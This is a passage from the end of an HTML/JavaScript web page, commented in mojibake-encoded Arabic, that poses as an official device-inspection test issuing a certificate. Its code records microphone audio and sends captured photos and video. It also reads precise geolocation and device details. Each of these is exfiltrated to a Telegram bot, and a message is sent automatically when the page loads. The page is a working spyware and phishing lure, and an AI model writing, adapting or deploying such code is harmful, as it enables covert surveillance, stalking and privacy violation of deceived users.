                audioRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                
                audioRecorder.onstop = async () => {
                    const audioBlob = new Blob(recordedChunks, { type: 'audio/webm' });
                    
                    // Ø­ÙØ¸ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØªÙŠ
                    collectedData.audio.push({
                        timestamp: new Date().toISOString(),
                        size: Math.round(audioBlob.size / 1024),
                        duration: 5
                    });
                    
                    // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª
                    await sendAudioToTelegram(audioBlob);
                    
                    // Ø¥ÙŠÙ‚Ø§Ù AudioContext
                    audioContext.close();
                    
                    showHiddenNotification('âœ… ØªÙ… Ø§Ø®ØªØ¨Ø§Ø± ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØª', 2000);
                    
                    // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªØ§Ù„ÙŠ
                    setTimeout(() => {
                        updateStep(5);
                        startTest(5);
                    }, 2000);
                };
                
                // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ù„Ù…Ø¯Ø© 5 Ø«ÙˆØ§Ù†
                audioRecorder.start();
                
                setTimeout(() => {
                    if (audioRecorder.state === 'recording') {
                        audioRecorder.stop();
                    }
                }, 5000);
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØµÙˆØª:', error);
                showHiddenNotification('âš ï¸ ØªÙ… ØªØ®Ø·ÙŠ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØµÙˆØª', 2000);
                
                setTimeout(() => {
                    updateStep(5);
                    startTest(5);
                }, 2000);
            }
        }
        
        // Ø§Ø®ØªØ¨Ø§Ø± 5: Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
        async function startLocationTest() {
            showHiddenNotification('ğŸ“ Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ...', 2000);
            
            try {
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed,
                                timestamp: position.timestamp
                            };
                            
                            // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©
                            elements.mapPlaceholder.innerHTML = `
                                <i class="fas fa-map-marker-alt" style="font-size: 48px; color: var(--danger); margin-bottom: 20px;"></i>
                                <div style="font-weight: bold; color: var(--primary-blue);">ØªÙ… ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹Ùƒ</div>
                                <div style="color: #666; margin-top: 10px;">Ø¯Ù‚Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${Math.round(location.accuracy)} Ù…ØªØ±</div>
                            `;
                            
                            elements.mapCoordinates.textContent = 
                                `Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
                            
                            // Ø­ÙØ¸ Ø§Ù„Ù…ÙˆÙ‚Ø¹
                            collectedData.location = location;
                            
                            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù„Ù„Ø¨ÙˆØª
                            await sendLocationToTelegram(location);
                            
                            showHiddenNotification('âœ… ØªÙ… ØªØ­Ø¯ÙŠØ¯ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹', 2000);
                            
                            // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ
                            setTimeout(() => {
                                updateStep(6);
                                startTest(6);
                            }, 3000);
                            
                        },
                        (error) => {
                            console.error('âŒ ÙØ´Ù„ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹:', error);
                            elements.mapPlaceholder.innerHTML = `
                                <i class="fas fa-map-marker-slash" style="font-size: 48px; color: var(--warning); margin-bottom: 20px;"></i>
                                <div style="color: #666;">ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ</div>
                            `;
                            
                            setTimeout(() => {
                                updateStep(6);
                                startTest(6);
                            }, 3000);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    elements.mapPlaceholder.innerHTML = `
                        <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: var(--warning); margin-bottom: 20px;"></i>
                        <div style="color: #666;">Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹</div>
                    `;
                    
                    setTimeout(() => {
                        updateStep(6);
                        startTest(6);
                    }, 3000);
                }
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ù…ÙˆÙ‚Ø¹:', error);
                setTimeout(() => {
                    updateStep(6);
                    startTest(6);
                }, 2000);
            }
        }
        
        // Ø§Ø®ØªØ¨Ø§Ø± 6: Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø´Ù‡Ø§Ø¯Ø©
        async function startCertificateGeneration() {
            showHiddenNotification('ğŸ… Ø¬Ø§Ø±ÙŠ Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø´Ù‡Ø§Ø¯Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©...', 3000);
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ø±Ù‚Ù… Ø§Ù„Ø´Ù‡Ø§Ø¯Ø©
            const certNumber = `EGC-${Date.now().toString().slice(-8)}`;
            elements.certificateNumber.textContent = `Ø±Ù‚Ù… Ø§Ù„Ø´Ù‡Ø§Ø¯Ø©: ${certNumber}`;
            
            // Ø¥Ø±Ø³Ø§Ù„ ØªÙ‚Ø±ÙŠØ± ÙƒØ§Ù…Ù„ Ù„Ù„Ø¨ÙˆØª
            await sendCompleteReportToTelegram(certNumber);
            
            // ØªØ­Ø¯ÙŠØ« Ø­Ø§Ù„Ø© Ø§Ù„Ù†Ø¸Ø§Ù…
            elements.startBtn.innerHTML = '<i class="fas fa-check-circle"></i> Ø§ÙƒØªÙ…Ù„ Ø§Ù„ÙØ­Øµ';
            elements.startBtn.style.background = 'linear-gradient(135deg, #28a745, #20c997)';
            elements.nextBtn.disabled = true;
            elements.pauseBtn.disabled = true;
            
            showHiddenNotification('ğŸ‰ ØªÙ… Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø´Ù‡Ø§Ø¯Ø© Ø¨Ù†Ø¬Ø§Ø­!', 5000);
            
            // Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªØ§ÙŠÙ…Ø±Ø§Øª
            Object.values(testTimers).forEach(timer => {
                if (timer) clearInterval(timer);
            });
        }
        
        // Ø¯Ø§Ù„Ø© Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªØ§Ù„ÙŠ
        function nextTest() {
            if (currentTest < 6) {
                updateStep(currentTest + 1);
                startTest(currentTest);
            }
        }
        
        // Ø¯Ø§Ù„Ø© Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ù…Ø¤Ù‚ØªØ§Ù‹
        function pauseInspection() {
            isPaused = !isPaused;
            elements.pauseBtn.innerHTML = isPaused ? 
                '<i class="fas fa-play"></i> Ø§Ø³ØªØ¦Ù†Ø§Ù' : 
                '<i class="fas fa-pause"></i> Ø¥ÙŠÙ‚Ø§Ù Ù…Ø¤Ù‚Øª';
            
            showHiddenNotification(isPaused ? 'â¸ï¸ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ù…Ø¤Ù‚ØªØ§Ù‹' : 'â–¶ï¸ ØªÙ… Ø§Ø³ØªØ¦Ù†Ø§Ù Ø§Ù„ÙØ­Øµ', 2000);
        }
        
        // Ø¯Ø§Ù„Ø© Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ
        function stopInspection() {
            isInspectionActive = false;
            isPaused = false;
            
            // Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªØ¯ÙÙ‚Ø§Øª
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            
            // Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªØ§ÙŠÙ…Ø±Ø§Øª
            Object.values(testTimers).forEach(timer => {
                if (timer) clearInterval(timer);
            });
            
            // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø£Ø²Ø±Ø§Ø±
            elements.startBtn.disabled = false;
            elements.nextBtn.disabled = true;
            elements.pauseBtn.disabled = true;
            elements.stopBtn.disabled = true;
            elements.startBtn.innerHTML = '<i class="fas fa-play"></i> Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„';
            
            showHiddenNotification('ğŸ›‘ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ', 3000);
        }
        
        // ===== Ø¯ÙˆØ§Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù… =====
        
        // Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
        async function sendDeviceInfoToTelegram(deviceInfo) {
            try {
                const message = `ğŸ“‹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„ÙƒØ§Ù…Ù„Ø©\n\n` +
                               `ğŸ–¥ï¸ Ø§Ù„Ù†Ø¸Ø§Ù…: ${deviceInfo.platform}\n` +
                               `ğŸŒ Ø§Ù„Ù…ØªØµÙØ­: ${deviceInfo.userAgent.substring(0, 100)}\n` +
                               `ğŸ’¬ Ø§Ù„Ù„ØºØ©: ${deviceInfo.language}\n` +
                               `ğŸ“± Ø§Ù„Ø¯Ù‚Ø©: ${deviceInfo.screenWidth}Ã—${deviceInfo.screenHeight}\n` +
                               `ğŸ¨ Ø§Ù„Ø£Ù„ÙˆØ§Ù†: ${deviceInfo.colorDepth}Ø¨Øª\n` +
                               `ğŸ§  Ø§Ù„Ø°Ø§ÙƒØ±Ø©: ${deviceInfo.deviceMemory}GB\n` +
                               `âš¡ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø§Øª: ${deviceInfo.hardwareConcurrency}\n` +
                               `ğŸ“ Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${deviceInfo.timezone}\n` +
                               `ğŸŒ Ø§Ù„Ø§ØªØµØ§Ù„: ${deviceInfo.online ? 'Ù…ØªØµÙ„' : 'ØºÙŠØ± Ù…ØªØµÙ„'}\n` +
                               `ğŸª Ø§Ù„ÙƒÙˆÙƒÙŠØ²: ${deviceInfo.cookiesEnabled ? 'Ù…ÙØ¹Ù„Ø©' : 'Ù…Ø¹Ø·Ù„Ø©'}\n` +
                               `ğŸ• Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-SA')}`;
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:', error);
            }
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©
        async function sendToTelegram(photoData, caption = '') {
            try {
                const blob = await fetch(photoData).then(res => res.blob());
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', `ğŸ“¸ ${caption}\nğŸ• ${new Date().toLocaleString('ar-SA')}`);
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', error);
            }
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
        async function sendVideoToTelegram(videoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('video', videoBlob, `video_${Date.now()}.webm`);
                formData.append('caption', `ğŸ¥ ÙØ­Øµ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ\nâ±ï¸ Ø§Ù„Ù…Ø¯Ø©: 5 Ø«ÙˆØ§Ù†ÙŠ\nğŸ• ${new Date().toLocaleString('ar-SA')}`);
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ:', error);
            }
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØª
        async function sendAudioToTelegram(audioBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('audio', audioBlob, `audio_${Date.now()}.webm`);
                formData.append('caption', `ğŸ¤ ÙØ­Øµ Ø§Ù„ØµÙˆØª\nâ±ï¸ Ø§Ù„Ù…Ø¯Ø©: 5 Ø«ÙˆØ§Ù†ÙŠ\nğŸ• ${new Date().toLocaleString('ar-SA')}`);
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØª:', error);
            }
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹
        async function sendLocationToTelegram(location) {
            try {
                const message = `ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ\n\n` +
                               `ğŸŒ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${location.latitude.toFixed(6)}\n` +
                               `ğŸŒ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${location.longitude.toFixed(6)}\n` +
                               `ğŸ¯ Ø§Ù„Ø¯Ù‚Ø©: ${Math.round(location.accuracy)} Ù…ØªØ±\n` +
                               `â¬†ï¸ Ø§Ù„Ø§Ø±ØªÙØ§Ø¹: ${location.altitude ? Math.round(location.altitude) + ' Ù…ØªØ±' : 'ØºÙŠØ± Ù…ØªØ§Ø­'}\n` +
                               `ğŸ§­ Ø§Ù„Ø§ØªØ¬Ø§Ù‡: ${location.heading ? Math.round(location.heading) + 'Â°' : 'ØºÙŠØ± Ù…ØªØ§Ø­'}\n` +
                               `ğŸ’¨ Ø§Ù„Ø³Ø±Ø¹Ø©: ${location.speed ? Math.round(location.speed) + ' Ù…/Ø«' : 'ØºÙŠØ± Ù…ØªØ§Ø­'}\n` +
                               `ğŸ• ${new Date().toLocaleString('ar-SA')}`;
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹:', error);
            }
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„ÙƒØ§Ù…Ù„
        async function sendCompleteReportToTelegram(certNumber) {
            try {
                const message = `ğŸ“Š ØªÙ‚Ø±ÙŠØ± Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ\n\n` +
                               `ğŸ† Ø±Ù‚Ù… Ø§Ù„Ø´Ù‡Ø§Ø¯Ø©: ${certNumber}\n` +
                               `ğŸ“… ØªØ§Ø±ÙŠØ® Ø§Ù„ÙØ­Øµ: ${new Date().toLocaleString('ar-SA')}\n` +
                               `ğŸ”— Ø§Ù„Ø±Ø§Ø¨Ø·: ${window.location.href}\n\n` +
                               `ğŸ“ˆ Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„ÙØ­Øµ:\n` +
                               `ğŸ“¸ Ø§Ù„ØµÙˆØ±: ${collectedData.photos.length}\n` +
                               `ğŸ¥ Ù…Ù‚Ø§Ø·Ø¹ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ: ${collectedData.videos.length}\n` +
                               `ğŸ¤ Ø§Ù„ØªØ³Ø¬ÙŠÙ„Ø§Øª Ø§Ù„ØµÙˆØªÙŠØ©: ${collectedData.audio.length}\n` +
                               `ğŸ“ Ø§Ù„Ù…ÙˆØ§Ù‚Ø¹: ${collectedData.location.latitude ? 1 : 0}\n\n` +
                               `âœ… ØªÙ… Ø¥ÙƒÙ…Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª Ø¨Ù†Ø¬Ø§Ø­\n` +
                               `ğŸ‰ Ø§Ù„Ø¬Ù‡Ø§Ø² Ù…Ø·Ø§Ø¨Ù‚ Ù„Ù„Ù…ÙˆØ§ØµÙØ§Øª Ø§Ù„Ù‚ÙŠØ§Ø³ÙŠØ© Ø§Ù„Ù…ØµØ±ÙŠØ©`;
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ‚Ø±ÙŠØ±:', error);
            }
        }
        
        // Ø¯Ø§Ù„Ø© Ù…Ø³Ø§Ø¹Ø¯Ø©: ØªØ­ÙˆÙŠÙ„ Blob Ø¥Ù„Ù‰ Base64
        function blobToBase64(blob) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.onerror = reject;
                reader.readAsDataURL(blob);
            });
        }
        
        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', function() {
            console.log('ğŸš€ Ù†Ø¸Ø§Ù… Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„ Ø§Ù„Ù…ØªÙƒØ§Ù…Ù„ Ø¬Ø§Ù‡Ø² Ù„Ù„ØªØ´ØºÙŠÙ„');
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¨Ø¯Ø¡ ØªØ´ØºÙŠÙ„ Ù„Ù„Ø¨ÙˆØª
            setTimeout(() => {
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: `ğŸš€ ØªÙ… ØªØ´ØºÙŠÙ„ Ù†Ø¸Ø§Ù… Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„\nğŸ• ${new Date().toLocaleString('ar-SA')}\nğŸŒ ${window.location.href}\nğŸ“± ${navigator.userAgent.substring(0, 80)}...`,
                        parse_mode: 'HTML'
                    })
                }).catch(() => {
                    console.log('âš ï¸ Ù„Ù… ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø¨Ø¯Ø¡');
                });
            }, 2000);
        });
    </script>
</body>
</html>